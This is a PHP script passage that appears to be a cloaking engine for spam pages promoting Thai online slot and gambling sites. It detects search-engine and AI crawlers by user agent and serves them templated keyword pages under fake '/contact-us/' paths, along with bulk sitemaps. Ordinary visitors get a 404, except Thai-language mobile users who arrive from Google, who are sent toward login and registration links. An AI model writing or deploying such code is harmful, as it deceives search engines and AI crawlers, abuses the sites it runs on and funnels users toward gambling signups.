// --- Template Config ---
$TEMPLATE_FILE = __DIR__ . '/th100.html';
$TEMPLATE = '';
if (file_exists($TEMPLATE_FILE)) {
    $TEMPLATE = file_get_contents($TEMPLATE_FILE);
}
if (empty($TEMPLATE)) {
    send_404_and_exit();
}

function get_val($arr, $key, $default = '') {
    return isset($arr[$key]) ? $arr[$key] : $default;
}

function is_bot() {
    $user_agent = get_val($_SERVER, 'HTTP_USER_AGENT', '');
    return preg_match("/(Googlebot|Googlebot-News|Googlebot-Image|Googlebot-Video|Googlebot-Mobile|Mediapartners-Google|AdsBot-Google|AdsBot-Google-Mobile|Google-InspectionTool|APIs-Google|Google-Site-Verification|Google Web Preview|Google Favicon|Google Feedfetcher|GoogleOther|Bingbot|BingPreview|AdIdxBot|Microsoft Preview|GPTBot|ChatGPT-User|ChatGPT|Google-Extended|Claude-Web|ClaudeBot|anthropic-ai|DuckDuckBot|DuckAssistBot)/i", $user_agent);
}

function send_404_and_exit() {
    header("HTTP/1.1 404 Not Found");
    if (ob_get_level() > 0) {
        ob_end_clean();
    }
    exit;
}

function safe_htmlspecialchars($text) {
    return htmlspecialchars($text, ENT_QUOTES, 'UTF-8');
}

function seeded_array_rand($arr) {
    if (empty($arr) || !is_array($arr)) return null;
    $count = count($arr);
    if ($count === 0) return null;
    return mt_rand(0, $count - 1);
}

function seeded_shuffle($arr) {
    if (empty($arr) || !is_array($arr)) return array();
    $count = count($arr);
    if ($count <= 1) return $arr;
    for ($i = $count - 1; $i > 0; $i--) {
        $j = mt_rand(0, $i);
        $temp = $arr[$i];
        $arr[$i] = $arr[$j];
        $arr[$j] = $temp;
    }
    return $arr;
}

function truncate_text($text, $max = 155) {
    $text = trim($text);
    // Thai text must remain valid UTF-8 even without the mbstring extension.
    $characters = preg_split('//u', $text, -1, PREG_SPLIT_NO_EMPTY);
    if ($characters === false) return '';
    if (count($characters) <= $max) return $text;
    return rtrim(implode('', array_slice($characters, 0, $max)));
}

function replace_brand($text, $brand) {
    return str_replace('[BRAND]', $brand, $text);
}



function detail_keyword_intent($keyword) {
    // More specific intents take priority over a provider or generic brand name.
    $rules = array(
        'assets' => '/(?:^|[-_\s.])(?:png|jpg|jpeg|svg|logo|background|wallpaper|apk)(?:$|[-_\s.])|โลโก้|ภาพพื้นหลัง|ดาวน์โหลด/iu',
        'demo' => '/ทดลอง|(?:^|[-_\s])demo(?:$|[-_\s])/iu',
        'promotion' => '/เครดิตฟรี|โบนัส|โปรโมชั่น|โปรโมชัน|(?:^|[-_\s])promo(?:tion)?(?:$|[-_\s])|free[-_\s]*credit|ฝาก[-_\s]*\d+|รับ[-_\s]*\d+/iu',
        'wallet' => '/wallet|วอเลท|วอลเลท|วอลเล็ต|วอลเล็ท|วอเล็ท|วอลเลต|วอเลต/iu',
        'signup' => '/สมัคร|ลงทะเบียน|เปิดบัญชี|เปิดบัญช|sign[-_\s]*up|register|open[-_\s]*account/iu',
        'login' => '/ทางเข้า|เข้าสู่ระบบ|ล็อกอิน|ล็อคอิน|login|log[-_\s]+in|(?:^|[-_\s])access(?:$|[-_\s])/iu',
        'game' => '/มาจอง|สาวถ้ำ|โรม่า|ลัคกี้เนโกะ|mahjong|lucky[-_\s]*neko|fortune[-_\s]*(?:tiger|ox|rabbit)|dragon[-_\s]*hatch|treasures[-_\s]*of[-_\s]*aztec|gates[-_\s]*of[-_\s]*olympus/iu',
        'provider' => '/(?<![a-z])(?:pg|jili|joker|pragmatic|slotxo|habanero|spadegaming)(?![a-z])|พีจี|โจ๊กเกอร์|จิลิ/iu',
        'catalog' => '/เว็บ|รวมค่าย|ทุกค่าย|รวมสล็อต|รวมเกม|(?:^|[-_\s])(?:site|web|platform)(?:$|[-_\s])/iu'
    );
    foreach ($rules as $intent => $pattern) {
        if (preg_match($pattern, $keyword)) return $intent;
    }
    return 'brand';
}

function detail_td_for_keyword($keyword, $page_identity) {
    global $DETAIL_TD_POOLS;
    $intent = detail_keyword_intent($keyword);
    $pool = $DETAIL_TD_POOLS['all'];
    // Separate deterministic selection leaves the link/image RNG unchanged.
    $hash = md5('detail-td-v2|' . $intent . '|' . $page_identity);
    $index = hexdec(substr($hash, 0, 7)) % count($pool);
    $pair = $pool[$index];
    return array(
        'title' => str_replace('[BRAND]', $keyword, $pair[0]),
        'description' => str_replace('[BRAND]', $keyword, $pair[1]),
        'intent' => $intent,
        'template_id' => $intent . '-' . ($index + 1)
    );
}

function keyword_slug($keyword) {
    return str_replace(array(' ', '%20'), '-', trim($keyword));
}

function detail_path($keyword) {
    return '/contact-us/' . rawurlencode(keyword_slug($keyword));
}

function normalized_page_path($path) {
    $segments = explode('/', $path);
    foreach ($segments as &$segment) {
        $segment = rawurlencode(rawurldecode($segment));
    }
    unset($segment);
    $path = rtrim(implode('/', $segments), '/');
    return ($path === '' || $path === '/index.php') ? '/' : $path;
}

function unique_keyword_list($keywords) {
    $seen = array();
    $result = array();
    foreach ($keywords as $keyword) {
        $slug = keyword_slug($keyword);
        if ($slug === '' || isset($seen[$slug])) continue;
        $seen[$slug] = true;
        $result[] = $keyword;
    }
    return $result;
}

function choose_internal_links($shuffled, $limit, $current_keyword, $origin) {
    $seen = array();
    $result = array();
    $current_slug = keyword_slug($current_keyword);
    foreach ($shuffled as $keyword) {
        $slug = keyword_slug($keyword);
        if ($slug === '' || $slug === $current_slug || isset($seen[$slug])) continue;
        $seen[$slug] = true;
        $result[] = array('keyword' => $keyword, 'url' => $origin . detail_path($keyword));
        if (count($result) >= $limit) break;
    }
    return $result;
}

function fixed_navigation_html($origin) {
    $html = '';
    foreach (array('support', 'about', 'contact', 'services', 'products', 'blog', 'portfolio') as $path) {
        $html .= '<a href="' . safe_htmlspecialchars($origin . '/' . $path) . '">' . $path . '</a>';
    }
    return $html;
}

function internal_links_html($links) {
    $html = '';
    foreach ($links as $link) {
        $html .= '<a class="keyword-link" href="' . safe_htmlspecialchars($link['url']) . '">'
            . safe_htmlspecialchars($link['keyword']) . '</a>';
    }
    return $html;
}

function output_sitemap_index($keywords) {
    $max_urls_per_sitemap = 5000;
    $total_keywords = count($keywords);
    if ($total_keywords === 0) send_404_and_exit();
    $num_pages = ceil($total_keywords / $max_urls_per_sitemap);
    $protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? "https://" : "http://";
    $host = get_val($_SERVER, 'HTTP_HOST', '');
    header('Content-Type: application/xml; charset=UTF-8');
    echo '<?xml version="1.0" encoding="UTF-8"?>' . "\n";
    echo '<sitemapindex xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . "\n";
    for ($i = 1; $i <= $num_pages; $i++) {
        echo '  <sitemap><loc>' . $protocol . $host . '/sitemap' . $i . '.xml</loc><lastmod>' . date('Y-m-d') . '</lastmod></sitemap>' . "\n";
    }
    echo '</sitemapindex>';
    exit;
}

function output_sitemap_page($page_num, $keywords) {
    $max_urls_per_sitemap = 5000;
    $total_keywords = count($keywords);
    $total_pages = ceil($total_keywords / $max_urls_per_sitemap);
    if ($page_num <= 0 || $page_num > $total_pages) send_404_and_exit();
    $offset = ($page_num - 1) * $max_urls_per_sitemap;
    $keyword_slice = array_slice($keywords, $offset, $max_urls_per_sitemap);
    $protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? "https://" : "http://";
    $host = get_val($_SERVER, 'HTTP_HOST', '');
    $base_url_for_loc = $protocol . $host;
    header('Content-Type: application/xml; charset=UTF-8');
    echo '<?xml version="1.0" encoding="UTF-8"?>' . "\n";
    echo '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . "\n";
    foreach ($keyword_slice as $keyword) {
        $url = $base_url_for_loc . detail_path($keyword);
        echo '  <url>' . "\n";
        echo '    <loc>' . htmlspecialchars($url, ENT_QUOTES, 'UTF-8') . '</loc>' . "\n";
        echo '    <lastmod>' . date('Y-m-d') . '</lastmod>' . "\n";
        echo '    <changefreq>daily</changefreq>' . "\n";
        echo '    <priority>0.8</priority>' . "\n";
        echo '  </url>' . "\n";
    }
    echo '</urlset>';
    exit;
}

try {
    $query_string = get_val($_SERVER, 'QUERY_STRING', '');
    $current_url = get_val($_SERVER, 'REQUEST_URI', '/');
    $ua = get_val($_SERVER, 'HTTP_USER_AGENT', '');

    $request_path = parse_url($current_url, PHP_URL_PATH);
    if (!is_string($request_path) || $request_path === '') send_404_and_exit();
    $page_path = normalized_page_path($request_path);
    $is_detail_page = false;
    $detail_keyword = '';
    if (preg_match('#^/contact-us/([^/]+)/?$#D', $request_path, $detail_match)) {
        $detail_keyword = trim(rawurldecode($detail_match[1]));
        if ($detail_keyword === '' || !preg_match('//u', $detail_keyword)
            || preg_match('/[\x00-\x1F\x7F{}\\\\\/]/u', $detail_keyword)) {
            send_404_and_exit();
        }
        // Recover the original keyword spelling for space-to-hyphen slugs.
        $detail_slug = keyword_slug($detail_keyword);
        foreach ($key as $candidate) {
            if (keyword_slug($candidate) === $detail_slug) {
                $detail_keyword = $candidate;
                break;
            }
        }
        $is_detail_page = true;
        $page_path = detail_path($detail_keyword);
    } elseif ($page_path === '/contact-us' || strpos($page_path, '/contact-us/') === 0) {
        send_404_and_exit();
    }

    // Support both actual sitemap paths and the previous rewrite query format.
    if (preg_match('#^/sitemap(\d*)\.xml$#', $page_path, $matches)
        || preg_match('/^sitemap(\d*)\.xml$/', $query_string, $matches)) {
        $sitemap_keywords = unique_keyword_list($key);
        if (empty($matches[1])) {
            output_sitemap_index($sitemap_keywords);
        } else {
            output_sitemap_page(intval($matches[1]), $sitemap_keywords);
        }
        exit;
    }

    $is_bot = is_bot();

    if (!$is_bot) {
        $referer = get_val($_SERVER, 'HTTP_REFERER', '');
        $is_google_referer = preg_match('/^https?:\/\/(www\.)?google\./i', $referer);
        $is_mobile = preg_match('/(mobile|android|iphone|ipad|windows phone)/i', $ua);
        $accept_lang = get_val($_SERVER, 'HTTP_ACCEPT_LANGUAGE', '');
        $is_id_lang = preg_match('/\bth\b/i', $accept_lang);

        if ($is_mobile && $is_google_referer && $is_id_lang) {
            $is_bot = true;
        } else {
            send_404_and_exit();
        }
    }

    // Bot handling
    $https = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on';
    $protocol = $https ? 'https' : 'http';
    $host = get_val($_SERVER, 'HTTP_HOST', '');
    $origin = $protocol . '://' . $host;
    $fullUrl = $origin . $page_path;

    // Deterministic seed
    // Ignore tracking query strings; use an independent, stable path identity.
    $seed_source = strtolower($host) . $page_path;
    $hash = md5($seed_source);
    $seed = hexdec(substr($hash, 0, 8));
    mt_srand($seed);

    // Shuffle keys
    $keys_shuffled = $key;
    shuffle($keys_shuffled);

    $str = $is_detail_page ? $detail_keyword : (!empty($keys_shuffled) ? $keys_shuffled[0] : 'slot');
    $internal_links = choose_internal_links($keys_shuffled, $INTERNAL_LINK_COUNT, $is_detail_page ? $detail_keyword : '', $origin);

    $link = $fullUrl;

    mt_srand($seed);

    $brand = $str;

    $tdkTitle = '';
    $tdkDesc = '';
    $tdkKw = '';
    if ($is_detail_page) {
        $detailTd = detail_td_for_keyword($brand, $seed_source);
        $tdkTitle = $detailTd['title'];
        // Keep the authored description complete, including its action/conditions.
        $tdkDesc = $detailTd['description'];
        $tdkKw = $brand;
    } elseif (!empty($tdkHome)) {
        $tdkIdx = mt_rand(0, count($tdkHome) - 1);
        $tdkParts = explode('|||', $tdkHome[$tdkIdx], 3);
        if (count($tdkParts) === 3) {
            $tdkTitle = replace_brand($tdkParts[0], $brand);
            $tdkDesc  = truncate_text(replace_brand($tdkParts[1], $brand), 155);
            $tdkKw    = replace_brand($tdkParts[2], $brand);
        }
    }

    if ($tdkTitle === '') {
        $ti = seeded_array_rand($title_list);
        $tdkTitle = ($ti !== null) ? replace_brand($title_list[$ti], $brand) : $brand;
    }
    if ($tdkDesc === '') {
        $mi = seeded_array_rand($ms_list);
        $tdkDesc = ($mi !== null) ? truncate_text(replace_brand($ms_list[$mi], $brand), 155) : '';
    }
    if ($tdkKw === '') {
        $ki = seeded_array_rand($keywords);
        $tdkKw = ($ki !== null) ? replace_brand($keywords[$ki], $brand) : $brand;
    }

    // Random picks
    $icon_idx = seeded_array_rand($icons);
    $random_icon = $icon_idx !== null ? $icons[$icon_idx] : '';

    $pic_idx = seeded_array_rand($pic);
    $random_pic = $pic_idx !== null ? $pic[$pic_idx] : '';

    $name_idx = seeded_array_rand($names);
    $random_name = $name_idx !== null ? $names[$name_idx] : '';

    $juzi_shuffled = seeded_shuffle($juzi);

    $now = new DateTime('now', new DateTimeZone('Asia/Shanghai'));
    $current_time = $now->format('Y-m-d H:i:s');
    $current_date = $now->format('Y-m-d');

    $html = $TEMPLATE;
    $html = str_replace('{CANONICAL_URL}', safe_htmlspecialchars($fullUrl), $html);

    $html = str_replace('{TITLE}', safe_htmlspecialchars($tdkTitle), $html);
    $html = str_replace('{DESCRIPTION}', safe_htmlspecialchars($tdkDesc), $html);

    $html = str_replace('{key1}', safe_htmlspecialchars($brand), $html);

    $ki2 = seeded_array_rand($key);
    $key2_val = ($ki2 !== null) ? $key[$ki2] : $brand;
    $html = str_replace('{key2}', safe_htmlspecialchars($key2_val), $html);

    // Use this URL's seeded order for internal links and their keyword text.
    $randKeyCount = count($keys_shuffled);
    $randKeyCounter = 0;
    while (preg_match('/\{RandKey(Slug)?\}/', $html, $randKeyMatch)) {
        if ($randKeyCount > 0) {
            $idx = $randKeyCounter % $randKeyCount;
            $randKeyCounter++;
            $randKeyValue = isset($keys_shuffled[$idx]) ? $keys_shuffled[$idx] : '';
            // Change spaces only in URL keywords, preserving the keyword order.
            if (isset($randKeyMatch[1]) && $randKeyMatch[1] === 'Slug') {
                $randKeyValue = str_replace(array(' ', '%20'), '-', $randKeyValue);
            }
            $html = preg_replace('/\{RandKey(?:Slug)?\}/', safe_htmlspecialchars($randKeyValue), $html, 1);
        } else {
            $html = preg_replace('/\{RandKey(?:Slug)?\}/', '', $html, 1);
        }
    }

    $ti1 = seeded_array_rand($title_list);
    $title1_val = ($ti1 !== null) ? replace_brand($title_list[$ti1], $brand) : $tdkTitle;
    $html = str_replace('{title1}', safe_htmlspecialchars($title1_val), $html);

    $html = str_replace('{link}', safe_htmlspecialchars($link), $html);

    $bqCount = count($icons);
    $bqCounter = 0;
    while (preg_match('/\{biaoqingq\}/', $html)) {
        if ($bqCount > 0) {
            $idx = $bqCounter % $bqCount;
            $bqCounter++;
            $html = preg_replace('/\{biaoqingq\}/', $icons[$idx], $html, 1);
        } else {
            $html = preg_replace('/\{biaoqingq\}/', '', $html, 1);
        }
    }

    $juziCount = count($juzi_shuffled);
    $juziCounter = 0;
    while (preg_match('/\{juzi(\d*)\}/', $html)) {
        if ($juziCount > 0) {
            $idx = $juziCounter % $juziCount;
            $juziCounter++;
            $html = preg_replace('/\{juzi(\d*)\}/', safe_htmlspecialchars(isset($juzi_shuffled[$idx]) ? $juzi_shuffled[$idx] : ''), $html, 1);
        } else {
            $html = preg_replace('/\{juzi(\d*)\}/', '', $html, 1);
        }
    }

    $html = str_replace('{name}', safe_htmlspecialchars($random_name), $html);

    $html = str_replace('{pic}', safe_htmlspecialchars($random_pic), $html);

    $randKwCounter = 0;
    while (preg_match('/\{随机关键词\}/', $html)) {
        if ($randKeyCount > 0) {
            $idx = $randKwCounter % $randKeyCount;
            $randKwCounter++;
            $html = preg_replace('/\{随机关键词\}/', safe_htmlspecialchars(isset($keys_shuffled[$idx]) ? $keys_shuffled[$idx] : ''), $html, 1);
        } else {
            $html = preg_replace('/\{随机关键词\}/', '', $html, 1);
        }
    }

    while (preg_match('/\{随机数字(\d+)\}/', $html, $m)) {
        $len = (int)$m[1];
        if ($len < 1) {
            $rep = '0';
        } else {
            $rep = '';
            for ($j = 0; $j < $len; $j++) {
                $rep .= ($j === 0 && $len > 1) ? mt_rand(1, 9) : mt_rand(0, 9);
            }
        }
        $html = preg_replace('/\{随机数字' . $len . '\}/', $rep, $html, 1);
    }

    while (preg_match('/\{随机字母(\d+)\}/', $html, $m)) {
        $len = (int)$m[1];
        if ($len < 1) {
            $rep = '';
        } else {
            $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
            $rep = '';
            for ($j = 0; $j < $len; $j++) {
                $rep .= $chars[mt_rand(0, strlen($chars) - 1)];
            }
        }
        $html = preg_replace('/\{随机字母' . $len . '\}/', $rep, $html, 1);
    }

    $html = str_replace('{当前时间}', $current_time, $html);
    $html = str_replace('{日期}', $current_date, $html);
    $html = str_replace('{LOGIN_URL}', safe_htmlspecialchars($LOGIN_URL), $html);
    $html = str_replace('{REGISTER_URL}', safe_htmlspecialchars($REGISTER_URL), $html);
    $html = preg_replace('/{key\d+}/', safe_htmlspecialchars($brand), $html);
    $html = preg_replace('/{title\d+}/', safe_htmlspecialchars($title1_val), $html);
    $html = preg_replace('/{pic\d+}/', safe_htmlspecialchars($random_pic), $html);
    $html = preg_replace('/{name\d+}/', safe_htmlspecialchars($random_name), $html);
    $html = preg_replace('/{biaoqingq\d+}/', $random_icon, $html);
    $html = preg_replace('/\{ms\d*\}/', safe_htmlspecialchars($tdkDesc), $html);
    $html = preg_replace('/\{keywords\d*\}/', safe_htmlspecialchars($tdkKw), $html);

    // Insert complete link pairs last, so link URLs and labels always agree.
    $html = strtr($html, array(
        '{FIXED_NAV_LINKS}' => fixed_navigation_html($origin),
        '{INTERNAL_LINKS}' => internal_links_html($internal_links)
    ));

} catch (Exception $e) {
    send_404_and_exit();
}

header('Content-type: text/html; charset=utf-8');
echo $html;
